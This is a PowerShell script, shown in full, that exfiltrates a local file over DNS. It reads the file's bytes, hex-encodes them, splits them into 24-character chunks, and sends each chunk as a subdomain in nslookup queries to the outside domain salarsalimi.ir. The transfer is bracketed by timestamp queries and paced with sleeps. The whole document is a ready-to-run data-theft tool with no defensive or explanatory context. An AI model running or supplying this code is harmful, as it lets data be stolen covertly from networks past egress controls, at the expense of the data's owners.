$inputFilePath = "C:\Path_To_File\InputFile.txt"
$baseDomain = "salarsalimi.ir"

# Read the content of the input file as bytes as convert to Hex
$fileBytes = [System.IO.File]::ReadAllBytes($inputFilePath)
$hexContent = $fileBytes | ForEach-Object { $_.ToString("X2") }

# Join the hex bytes into a single string and chunck it
$hexString = $hexContent -join ""
$hexChunks = ($hexString -split "(.{24})" | Where-Object { $_ -ne "" })



# Add the first query with the current time
$currentTime = (Get-Date).ToString("yyyy-MM-dd_HH-mm-ss")
$startQuery = "$currentTime.$baseDomain"
nslookup "$startQuery" 2>$null
$startQuery = $currentTime
Start-Sleep -Seconds 5


# Append each chunk as a DNS query and print
foreach ($chunk in $hexChunks) {
    $dnsQuery = "$chunk.$baseDomain"
    nslookup "$chunk.$baseDomain" 2>$null
    Write-Host "Generated DNS Query: $dnsQuery"
    Start-Sleep -Seconds 1
}

# Add the final query with the current time again
Start-Sleep -Seconds 5
$currentTime = (Get-Date).ToString("yyyy-MM-dd_HH-mm-ss")
$endQuery = "$currentTime.$baseDomain"
nslookup "$endQuery" 2>$null
$endQuery = "$currentTime"

Write-Output "Start $startQuery"
Write-Output "Stop $endQuery"
